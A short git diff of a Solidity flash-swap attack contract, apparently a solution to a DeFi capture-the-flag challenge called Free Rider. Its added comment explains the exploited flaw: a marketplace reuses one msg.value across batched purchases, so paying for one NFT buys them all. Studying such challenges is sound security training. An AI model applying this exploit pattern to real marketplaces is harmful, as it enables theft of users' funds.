@@ -69,17 +69,20 @@ contract FreeRider is IUniswapV2Callee, IERC721Receiver {
         //  serving.
         // address token0 = IUniswapV2Pair(msg.sender).token0();
         // address token1 = IUniswapV2Pair(msg.sender).token1();
-        uint256 NFT_PRICE = 15 * (10 ** 18); 
-        uint256 desiredETH = 15 * (10 ** 18);
         (uint256 borrowedAmount) = abi.decode(data, (uint256));
         require(weth.balanceOf(address(this)) == initialBalance + borrowedAmount, 
                 "Not borrowing enough weth");
         require(weth.balanceOf(address(this)) > borrowedAmount, 
                 "withdraw not possible"); 
         
-        // Wealthy!!
+        // We are Wealthy now!!
         
         // desiredETH + transaction fee
+        // The bug of this challenge happens in the _buyOne function, which
+        // use the same msg.value over all transaction. we simply have to 
+        // use min([price0, price1, ...]) purchase them all.
+        uint256 NFT_PRICE = 15 * (10 ** 18); 
+        uint256 desiredETH = NFT_PRICE;
         uint256 amountUsed = desiredETH * 110 / 100;
         weth.withdraw(amountUsed);
         require(address(this).balance >= NFT_PRICE, "can at least buy one");
